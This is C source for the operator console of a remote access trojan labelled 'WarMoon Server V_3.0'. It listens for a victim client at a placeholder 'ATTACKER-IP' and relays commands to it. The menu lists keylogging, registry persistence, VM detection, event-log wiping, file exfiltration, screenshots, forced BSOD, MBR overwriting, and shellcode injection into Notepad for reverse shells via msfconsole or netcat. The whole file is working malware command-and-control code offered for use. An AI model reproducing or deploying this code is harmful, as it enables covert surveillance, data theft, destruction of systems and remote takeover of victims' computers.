#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <pthread.h>

char *ServerIP = "ATTACKER-IP"; //CHANGE THIS
unsigned short ServerPort = 50000;
unsigned short ServerTransferPort = 49500;

unsigned char Resp[1];
double Ver = 3.0;
int UpdatedUrl = 0;
int LoggerActive = 0;

struct sockaddr_in SAddr, CAddr;
int filefd;

time_t rawtime;
struct tm * tm;

void GetTime()
{
	time (&rawtime);
	tm = localtime(&rawtime);
	printf("\n\033[0;34mCurrent Time: %d/%d/%d %d:%d:%d\033[0m\n\n", tm->tm_mday, tm->tm_mon + 1, tm->tm_year + 1900, tm->tm_hour, tm->tm_min, tm->tm_sec);
}

void HelpMenu()
{
	printf("\033[1;31m Note: Commands that have \033[0;33m(A*)\033[1;31m require admin privileges. Use 'isadmin' to check first.\033[0m\n");
	printf("\033[1;31m Default Windows CMD commands and custom ones:\033[0m\n");
	printf("\n");
	printf("\033[0;33m Command :\033[1;31m Description\033[0m\n");
	printf("\033[0;33m ---------\033[1;31m -----------\033[0m\n");
	printf("\033[0;33m q : \033[1;31mClose connection and exit.\033[0m\n");
	printf("\033[0;33m menu : \033[1;31mPrint the Help Screen (This :D)\033[0m\033[0m\n");
	printf("\033[0;33m startlogger : \033[0;33m(A*)\033[1;31m Start Keylogger. LogFile In 'C:\\Users\\out.txt'.\033[0m\n");
	printf("\033[0;33m stoplogger : \033[0;33m(A*)\033[1;31m Stop Keylogger.\033[0m\n");
	printf("\033[0;33m persistence1 : \033[1;31mPersistence on the victim host (HKCU).\033[0m\n");
	printf("\033[0;33m persistence2 : \033[1;31m(RunOnce) Persistence on the victim host (HKCU).\033[0m\n");
	printf("\033[0;33m persistence3 : \033[1;31mPersistence on the victim host (HKCU).\033[0m\n");
	printf("\033[0;33m persistence4 : \033[0;33m(A*)\033[1;31m Persistence on the victim host (HKLM).\033[0m\n");
	printf("\033[0;33m persistence5 : \033[0;33m(A*)\033[1;31m (RunOnce) Persistence on the victim host (HKLM).\033[0m\n");
	printf("[!]Remember that you can also create your own persistence keys.\n");
	printf("\033[0;33m removepers : \033[1;31mRemove all persistence techniques.\033[0m\n");
	printf("\033[0;33m isvm : \033[1;31mCheck if client is running inside of a VM.\033[0m\n");
	printf("\033[0;33m isadmin : \033[1;31mCheck for admin privileges.\033[0m\n");
	printf("\033[0;33m cleanlogs : \033[0;33m(A*)\033[1;31m Removes App, Security, Setup and System logs.\033[0m\n");
	printf("\033[0;33m updateurl : \033[1;31mUpdate the URL from which the client will download files.\033[0m\n");
	printf("\033[0;33m download : \033[1;31mDownload a file from the server to the victim machine.\033[0m\n");
	printf("\033[0;33m getfile : \033[1;31mRetrieve a file from the victim machine to the server.\033[0m\n");
	printf("\033[0;33m diskspace : \033[1;31mGet disk space total/free.\033[0m\n");
	printf("\033[0;33m drives : \033[1;31mPrint available drives.\033[0m\n");
	printf("\033[0;33m screenshot : \033[1;31mTakes a screenshot of the victim's desktop and transfers it to the server.\033[0m\n");
	printf("\033[0;33m cleanbin : \033[1;31mEmpty all recycle bins for all drives.\033[0m\n");
	printf("\033[0;33m hostname : \033[1;31mPrint hostname.\033[0m\n");
	printf("\033[0;33m popup : \033[1;31mSpawn MessageBox on the victim's desktop.\033[0m\n");
	printf("\033[0;33m bsodwin : \033[1;31mRaise BSOD.\033[0m\n");
	printf("\033[0;33m wipembr : \033[0;33m(A*)\033[1;31m Overwrite MBR. [!]Win7: Works, but the client will crash.\033[0m\n");
	printf("\n");
	printf("\033[1;31mThe following functions are used to inject shellcode and obtain a reverse shell. [!]Set the listeners first\033[0m\n");
	printf("\033[0;33m inject64 : \033[1;31m(x64) Injects shellcode into Notepad. [!]Set msfconsole first.\033[0m\n");
	printf("\033[0;33m startcat : \033[1;31m(x64) Executes shellcode to receive a netcat session. [!]Start netcat in listening mode first on the correct port. netcat -lvnp 443, (netcat -lvnp 38524 for fallback shell)\033[0m\n");
	printf("\n");
	printf("\033[0;34m In The Future... -> PrivEsc, and maybe more :D\033[0m\n");
}

void Logo()
{
printf("\033[1;31m [+] 230-\033[0;35m                                                                     \033[0m\n");
printf("\033[1;31m [+] 230-\033[0;35m  █     █░ ▄▄▄       ██▀███   ███▄ ▄███▓ ▒█████   ▒█████   ███▄    █ \033[0m\n");
printf("\033[1;31m [+] 230-\033[0;35m ▓█░ █ ░█░▒████▄    ▓██ ▒ ██▒▓██▒▀█▀ ██▒▒██▒  ██▒▒██▒  ██▒ ██ ▀█   █ \033[0m\n");
printf("\033[1;31m [+] 230-\033[0;35m ▒█░ █ ░█ ▒██  ▀█▄  ▓██ ░▄█ ▒▓██    ▓██░▒██░  ██▒▒██░  ██▒▓██  ▀█ ██▒\033[0m\n");
printf("\033[1;31m [+] 230-\033[0;35m ░█░ █ ░█ ░██▄▄▄▄██ ▒██▀▀█▄  ▒██    ▒██ ▒██   ██░▒██   ██░▓██▒  ▐▌██▒\033[0m\n");
printf("\033[1;31m [+] 230-\033[0;35m ░░██▒██▓  ▓█   ▓██▒░██▓ ▒██▒▒██▒   ░██▒░ ████▓▒░░ ████▓▒░▒██░   ▓██░\033[0m\n");	printf("\033[1;31m [+] 230-\033[0;35m ░ ▓░▒ ▒   ▒▒   ▓▒█░░ ▒▓ ░▒▓░░ ▒░   ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ \033[0m\n");	printf("\033[1;31m [+] 230-\033[0;35m   ▒ ░ ░    ▒   ▒▒ ░  ░▒ ░ ▒░░  ░      ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░░   ░ ▒░\033[0m\n");	printf("\033[1;31m [+] 230-\033[0;35m   ░   ░    ░   ▒     ░░   ░ ░      ░   ░ ░ ░ ▒  ░ ░ ░ ▒     ░   ░ ░ \033[0m\n");
printf("\033[1;31m [+] 230-\033[0;35m     ░          ░  ░   ░            ░       ░ ░      ░ ░           ░ \033[0m\n");
printf("\033[1;31m [+] 230-\033[0;35m                                                                     \033[0m\n");
printf("\033[1;31m [+] 230-\033[0;35m                            Server V_%.1f                            \033[0m\n", Ver);
printf("\n");
}

void SigInter(int Sig)
{
	printf("\nCaught SIGINT (CTRL+C)\n");
	printf("If you want the Client to also terminate, press a key different to Y/y, and then send 'q' using the cli\n");
	printf("If you press Y/y, the client process will remain open.\n");
	printf("Are you sure you want to exit? Yes: Y/y | No: N/n : \n");
	scanf("%1s", Resp);

	if (Resp[0] == 'Y' || Resp[0] == 'y')
	{
		printf("\033[0;35m[+] Quitting.\033[0m\n");
		exit(0);
	}
	else
	{
		printf("\033[0;35m[+] Not quitting. Press [ENTER]\033[0m\n");
		return;
	}
}

void* ReceiveFileFromClient()
{
	char FileName[256];
	char RecvBuff[1024];
	int BytesReceived = 0;
	int ClientSocket2;

	int OptVal2 = 1;
	socklen_t ClientLength2;

	filefd = socket(AF_INET, SOCK_STREAM, 0);

	if (setsockopt(filefd, SOL_SOCKET, SO_REUSEADDR, &OptVal2, sizeof(OptVal2)) != 0)
	{
		printf("\033[1;31m[-] Error setting socket option!\033[0m\n");
	}

	SAddr.sin_family = AF_INET;
	SAddr.sin_addr.s_addr = inet_addr(ServerIP);
	SAddr.sin_port = htons(ServerTransferPort);

	bind(filefd, (struct sockaddr *) &SAddr, sizeof(SAddr));

	listen(filefd, 5);

	ClientLength2 = sizeof(CAddr);

	ClientSocket2 = accept(filefd, (struct sockaddr *) &CAddr, &ClientLength2);
	if (ClientSocket2 < 0)
	{
		printf("\033[1;31m[-] Error in accept!\033[0m\n");
	}

	read(ClientSocket2, FileName, sizeof(FileName));
	printf("\nReceiving file: %s\n", FileName);

	FILE *fp = fopen(FileName, "wb");
	if (fp == NULL)
	{
		printf("\033[1;31m[-] Error opening file to write.\033[0m\n");
		close(ClientSocket2);
		close(filefd);
		return NULL;
	}

	while ((BytesReceived = read(ClientSocket2, RecvBuff, sizeof(RecvBuff))) > 0)
	{
		fwrite(RecvBuff, 1, BytesReceived, fp);
	}

	if (BytesReceived < 0)
	{
		printf("\033[1;31m[-] Error receiving data.\033[0m\n");
	}

	printf("\033[0;35m[+] File received successfully. Press [ENTER] to continue.\033[0m\n");

	fclose(fp);
	close(ClientSocket2);
	close(filefd);
}

int main(int argc, char *argv[])
{
	if (argc != 2)
	{
		GetTime();
		printf("Usage: %s menu | start\n", argv[0]);
		return 0;
	}

	if (strcmp(argv[1], "menu") == 0)
	{
		GetTime();
		Logo();
		HelpMenu();
		return 0;
	}
	else if (strcmp(argv[1], "start") == 0)
	{
		GetTime();
		goto StartServer;
	}

	else
	{
		printf("Invalid argument. Please use 'menu' or 'start'...\n");
		return 0;
	}

	StartServer:
	signal(SIGINT, SigInter);
	Logo();
	HelpMenu();
	printf("\n\033[1;31m - ...Waiting For Shell... - \033[0m\n");
	int err;
	pthread_t tid;
	int sock;
	int ClientSocket;
	char Buffer[1024];
	char ResponseBuffer[18384];
	struct sockaddr_in ServerAddress, ClientAddress;
	int OptVal = 1;
	socklen_t ClientLength;

	sock = socket(AF_INET, SOCK_STREAM, 0);

	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &OptVal, sizeof(OptVal)) != 0)
	{
		printf("\033[1;31m[-] Error setting socket option!\033[0m\n");
		return 1;
	}

	ServerAddress.sin_family = AF_INET;
	ServerAddress.sin_addr.s_addr = inet_addr(ServerIP);
	ServerAddress.sin_port = htons(ServerPort);

	bind(sock, (struct sockaddr *) &ServerAddress, sizeof(ServerAddress));

	listen(sock, 5);

	ClientLength = sizeof(ClientAddress);

	ClientSocket = accept(sock, (struct sockaddr *) &ClientAddress, &ClientLength);

	GetTime();
	printf("\033[0;35m[+] Got Shell From : %s\033[0m\n", inet_ntoa(ClientAddress.sin_addr));

	while (1)
	{
		redo:
		memset(&Buffer, 0, sizeof(Buffer));
		memset(&ResponseBuffer, 0, sizeof(ResponseBuffer));
		printf("\033[0;35mWarMoon@%s\033[0m:", inet_ntoa(ClientAddress.sin_addr));
		fgets(Buffer, sizeof(Buffer), stdin);
		strtok(Buffer, "\n");
		write(ClientSocket, Buffer, sizeof(Buffer));

		if (strncmp(Buffer, "q", 1) == 0)
		{
			GetTime();
			break;
		}

		else if (strncmp(Buffer, "startlogger", 11) == 0)
		{
			if (LoggerActive == 0)
			{
				printf("Check if the file was created! If not, the logger didn't start!\n");
				GetTime();
				LoggerActive = 1;
				goto redo;
			}

			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "stoplogger", 10) == 0)
		{

			if (LoggerActive == 1)
			{
				recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
				printf("%s", ResponseBuffer);
				GetTime();
				LoggerActive = 0;
				goto redo;
			}

			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if(strncmp(Buffer, "cd ", 3) == 0)
		{
			goto redo;
		}

		else if (strncmp(Buffer, "persistence1", 12) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "persistence2", 12) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "persistence3", 12) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "persistence4", 12) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "persistence5", 12) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "removepers", 10) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "isvm", 4) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "wipembr", 7) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "cleanlogs", 9) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "inject64", 8) == 0)
		{
			printf("Check if you received a shell in the msfconsole tab!\n");
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "startcat", 8) == 0)
		{
			printf("Check if you received a connection!\n");
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "download", 8) == 0)
		{
			if (UpdatedUrl == 0)
			{
				printf("\033[1;31m[!] You must first use 'updateurl'\033[0m\n");
				goto redo;
			}

			char Command[128];
			char FileToDownload[30];
			printf("\033[0;35m[!] (No spaces allowed in) Filename :\033[0m ");

			if (fgets(FileToDownload, sizeof(FileToDownload), stdin) != NULL)
			{
				if (FileToDownload[0] == '\n')
				{
					printf("\033[1;31m[!] You must give a Filename!\033[0m\n");
					goto redo;
				}
			}

			snprintf(Command, sizeof(Command), "download %s", FileToDownload);
			send(ClientSocket, Command, strlen(Command), 0);
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			memset(&Command, 0, sizeof(Command));
			memset(&FileToDownload, 0, sizeof(FileToDownload));
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "updateurl", 9) == 0)
		{
			char Command[64];
			char UpdatedURL[30];
			printf("\033[0;35m [!] ONLY HTTP is allowed! USE THIS FORMAT -> http://192.168.1.1/ :\033[0m ");

			if (fgets(UpdatedURL, sizeof(UpdatedURL), stdin) != NULL)
			{
				if (UpdatedURL[0] == '\n')
				{
					printf("\033[1;31m[!] You must write a URL!\033[0m\n");
					goto redo;
				}
			}

			snprintf(Command, sizeof(Command), "updateurl %s", UpdatedURL);
			send(ClientSocket, Command, strlen(Command), 0);
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			memset(&Command, 0, sizeof(Command));
			memset(&UpdatedURL, 0, sizeof(UpdatedURL));
			GetTime();
			UpdatedUrl = 1;
			goto redo;
		}

		else if (strncmp(Buffer, "getfile", 7) == 0)
		{
			char CommandName[64];
			char GetFileName[30];

			printf("\033[0;35m[!] (No spaces allowed in) Filename to retrieve:\033[0m ");

			if (fgets(GetFileName, sizeof(GetFileName), stdin) != NULL)
			{
				size_t FileNameLen = strlen(GetFileName);
				if (FileNameLen > 0 && GetFileName[FileNameLen - 1] == '\n')
				{
					GetFileName[FileNameLen - 1] = '\0';
				}

				if (strlen(GetFileName) == 0)
				{
					printf("\033[1;31m[!] You must give a Filename!\033[0m\n");
					goto redo;
				}
			}

			snprintf(CommandName, sizeof(CommandName), "getfile %s", GetFileName);
			send(ClientSocket, CommandName, strlen(CommandName), 0);

			err = pthread_create(&tid, NULL, (void*)&ReceiveFileFromClient, &filefd);
			if (err != 0)
			{
				printf("Can't create thread: %s\n", strerror(err));
			}

			memset(&CommandName, 0, sizeof(CommandName));
			memset(&GetFileName, 0, sizeof(GetFileName));
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "diskspace", 9) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "cleanbin", 8) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "drives", 6) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "isadmin", 7) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "hostname", 8) == 0)
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), 0);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "screenshot", 10) == 0)
		{
			err = pthread_create(&tid, NULL, (void*)&ReceiveFileFromClient, &filefd);
			if (err != 0)
			{
				printf("Can't create thread: %s\n", strerror(err));
			}
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "popup", 5) == 0)
		{
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "bsodwin", 7) == 0)
		{
			GetTime();
			goto redo;
		}

		else if (strncmp(Buffer, "menu", 4) == 0)
		{
			HelpMenu();
			GetTime();
			goto redo;
		}

		else
		{
			recv(ClientSocket, ResponseBuffer, sizeof(ResponseBuffer), MSG_WAITALL);
			printf("%s", ResponseBuffer);
			GetTime();
			goto redo;
		}
	}
	return 0;
}
